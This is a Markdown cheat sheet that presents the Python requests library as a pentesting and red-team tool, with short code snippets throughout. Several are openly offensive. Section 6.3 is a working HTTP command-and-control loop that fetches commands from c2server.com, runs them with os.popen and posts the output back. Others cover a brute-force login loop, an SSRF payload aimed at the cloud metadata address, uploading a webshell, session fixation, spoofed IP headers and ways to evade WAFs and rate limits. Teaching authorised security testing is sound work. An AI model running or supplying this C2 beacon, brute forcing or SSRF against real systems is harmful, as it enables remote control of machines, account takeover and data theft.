
# requests – Pentester & Red Team Reference

## 1. Overview
- `requests` is a Python HTTP library for sending HTTP/HTTPS requests easily.  
- Abstracts away `urllib` complexity.  
- Allows **web exploitation**, **API interaction**, **phishing kit automation**, and **command-and-control over HTTP**.  

**Why It’s Important for Pentesters/Red Teamers**
- Automate **web app recon** and exploitation.
- Interact with **REST APIs** during attacks.
- Exfiltrate or control over **covert HTTP channels**.
- Script **brute force** and **credential stuffing**.
- **Bypass WAFs** and fingerprinting by controlling headers and sessions.

---

## 2. Installation
```bash
pip install requests
```

---

## 3. Core Functions
| Function          | Purpose |
|-------------------|---------|
| `requests.get()`  | Send HTTP GET request. |
| `requests.post()` | Send HTTP POST request (form or JSON). |
| `requests.put()`  | Upload or update resources. |
| `requests.delete()` | Delete resources. |
| `requests.head()` | Retrieve headers only. |
| `requests.options()` | Get allowed HTTP methods. |

---

## 4. Basic Usage
```python
import requests

# Simple GET
resp = requests.get("https://target.com")
print(resp.status_code, resp.text)

# POST with form data
data = {"username": "admin", "password": "password"}
resp = requests.post("https://target.com/login", data=data)
print(resp.text)
```

---

## 5. Key Features for Offensive Use

### 5.1 Custom Headers (Fingerprint Evasion)
```python
headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "X-Forwarded-For": "192.168.1.100"
}
resp = requests.get("https://target.com", headers=headers)
```
**Uses**:
- Mimic legitimate browsers.
- Spoof IPs (sometimes bypasses IP-based restrictions).

### 5.2 Handling Cookies & Sessions
```python
session = requests.Session()
session.get("https://target.com")
session.cookies.set("PHPSESSID", "malicious_session")
resp = session.get("https://target.com/dashboard")
```
**Uses**:
- Maintain authenticated sessions.
- Perform **session fixation**.

### 5.3 Sending JSON Payloads (API Attacks)
```python
payload = {"cmd": "id"}
resp = requests.post("https://target.com/api", json=payload)
print(resp.json())
```
**Uses**:
- Interact with vulnerable APIs.
- Trigger injection attacks in JSON endpoints.

### 5.4 File Uploads
```python
files = {"file": open("webshell.php", "rb")}
resp = requests.post("https://target.com/upload", files=files)
```
**Uses**:
- Exploit insecure file upload endpoints.
- Deliver payloads.

### 5.5 Timeout & Retry Control
```python
resp = requests.get("https://target.com", timeout=5)
```
**Uses**:
- Avoid script hanging on slow/broken endpoints.
- Combine with `retry` strategies for scanning.

### 5.6 Proxies (Traffic Redirection)
```python
proxies = {
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080"
}
requests.get("https://target.com", proxies=proxies, verify=False)
```
**Uses**:
- Route through **Burp Suite**, **ZAP**, or TOR.
- Inspect and modify requests live.

### 5.7 SSL Verification Bypass
```python
requests.get("https://target.com", verify=False)
```
**Uses**:
- Ignore invalid/self-signed certs during testing.

### 5.8 Streaming Responses (Large File Exfil)
```python
with requests.get("https://target.com/largefile", stream=True) as r:
    for chunk in r.iter_content(chunk_size=1024):
        print(chunk)
```

### 5.9 Authentication
```python
from requests.auth import HTTPBasicAuth

resp = requests.get("https://target.com/admin", auth=HTTPBasicAuth("user", "pass"))
```
**Uses**:
- Test HTTP Basic/Digest Auth endpoints.
- Brute force login-protected paths.

---

## 6. Advanced Red Team Use Cases

### 6.1 Brute Force Login
```python
import requests

url = "https://target.com/login"
for pwd in ["123456", "admin", "password"]:
    resp = requests.post(url, data={"username": "admin", "password": pwd})
    if "Welcome" in resp.text:
        print(f"[+] Password found: {pwd}")
        break
```

### 6.2 API Enumeration
```python
endpoints = ["/api/v1/users", "/api/v1/admin", "/api/v1/debug"]
for ep in endpoints:
    r = requests.get("https://target.com" + ep)
    print(ep, r.status_code)
```

### 6.3 C2 Over HTTP
```python
import requests, time, os

while True:
    cmd = requests.get("https://c2server.com/command").text
    output = os.popen(cmd).read()
    requests.post("https://c2server.com/result", data={"output": output})
    time.sleep(10)
```

### 6.4 SSRF Payload Delivery
```python
target = "https://target.com/fetch"
payload = {"url": "http://169.254.169.254/latest/meta-data/"}
r = requests.post(target, data=payload)
print(r.text)
```

---

## 7. Common Pitfalls
- **SSL warnings**: Use `urllib3.disable_warnings()` when bypassing cert checks.
- **WAF blocking**: Rotate User-Agent, referrers, and IPs.
- **Rate limiting**: Implement random delays.

---

## 8. Useful Add-Ons
- **`requests[socks]`** → SOCKS proxy support.
- **`requests-toolbelt`** → Multipart encoder, advanced file uploads.
- **`cloudscraper`** → Bypass Cloudflare protections.

---

## 9. References
- [Requests Documentation](https://docs.python-requests.org/en/latest/)
- [HTTP RFC 2616](https://www.rfc-editor.org/rfc/rfc2616)
